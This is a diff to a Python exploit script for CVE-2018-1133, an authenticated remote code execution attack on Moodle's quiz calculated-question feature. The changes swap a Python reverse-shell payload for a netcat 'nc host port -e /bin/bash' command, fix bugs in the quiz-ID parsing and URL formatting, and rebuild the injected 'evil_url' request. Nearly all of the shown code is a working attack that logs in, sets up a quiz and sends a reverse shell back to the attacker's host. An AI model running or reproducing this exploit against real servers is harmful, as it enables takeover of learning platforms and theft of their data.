@@ -21,7 +21,8 @@ class CVE2018_1133:
         self.cid = cid
         self.session = requests.Session()
         self.session.headers.update(self.headers)
-        self.payload = "(python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((\"" + self.host + "\"," + self.port + "))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call([\"/bin/sh\",\"-i\"])%3b')"
+        #self.payload = "(python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((\"" + self.host + "\"," + self.port + "))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call([\"/bin/sh\",\"-i\"])%3b')"
+        self.payload = "nc {} {} -e /bin/bash".format(self.host, self.port)
 
     # login with creds
     def login(self):
@@ -43,7 +44,7 @@ class CVE2018_1133:
         sesskey = tree.xpath('.//form[@method="post"]//input[@name="sesskey"]/@value')
         if sesskey[0]:
             self.session_key = sesskey[0]
-            print (LogColors.GREEN + "successfully parse session key..." + LogColors.ENDC)
+            print (LogColors.YELLOW + "successfully parse session key..." + LogColors.ENDC)
         else:
             print (LogColors.RED + "failed parse session key. you are idiot :(" + LogColors.ENDC)
             sys.exit()
@@ -210,7 +211,7 @@ class CVE2018_1133:
             link = tree.xpath(".//div//a/@href")
             if link[0]:
                 link = link[0]
-                self.cmid = link[link.find("?id=")+4:link.find("&amp")]
+                self.cmid = link[link.find("?id=")+4:link.find("&")]
                 print (LogColors.YELLOW + "Quiz ID: " + self.cmid + LogColors.ENDC)
                 print (LogColors.YELLOW + "successfully configure quiz..." + LogColors.ENDC)
         else:
@@ -220,7 +221,7 @@ class CVE2018_1133:
     # edit quiz
     def edit_quiz(self):
         print (LogColors.BLUE + "edit quiz page..." + LogColors.ENDC)
-        r = self.session.get(self.url + "/mod/quiz/edit.php?cmid={}".formta(self.cmid))
+        r = self.session.get(self.url + "/mod/quiz/edit.php?cmid={}".format(self.cmid))
         if r.ok:
             print (LogColors.YELLOW + "successfully load edit quiz..." + LogColors.ENDC)
         else:
@@ -309,11 +310,12 @@ class CVE2018_1133:
     def send_payload(self):
         print (LogColors.BLUE + "send evil payload with reverse shell..." + LogColors.ENDC)
         print (LogColors.YELLOW + self.payload + LogColors.ENDC)
-        return_url = "/mod/quiz/edit.php?cmid={}".format(self.cmid)
-        evil_url = self.url + "/question/question.php?returnurl={}".format(return_url)
-        evil_url += "&addonpage=0&appendqnumstring=addquestion&scrollpos=0&id=8&wizardnow=datasetitems"
-        evil_url += "&cmid={}&0=({})".format(self.cmid, self.payload)
 
+        evil_url = self.url + "/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid={}".format(self.cmid)
+        evil_url += "&addonpage=0&appendqnumstring=addquestion&scrollpos=0&id=9&wizardnow=datasetitems"
+        evil_url += "&cmid={}".format(self.cmid)
+        evil_url += "&0=({})".format(self.payload)
+        print (LogColors.YELLOW + "evil url: " + evil_url + LogColors.ENDC)
         r = self.session.get(evil_url, verify = False)
         if r.ok:
             print (LogColors.GREEN + "=^..^= good job. successssssssfully send payload. hacked. =^..^=" + LogColors.ENDC)
@@ -331,6 +333,7 @@ class CVE2018_1133:
         self.add_quiz()
         self.configure_quiz()
         self.edit_quiz()
+        self.calc_question()
         self.add_evil()
         self.send_payload()
 
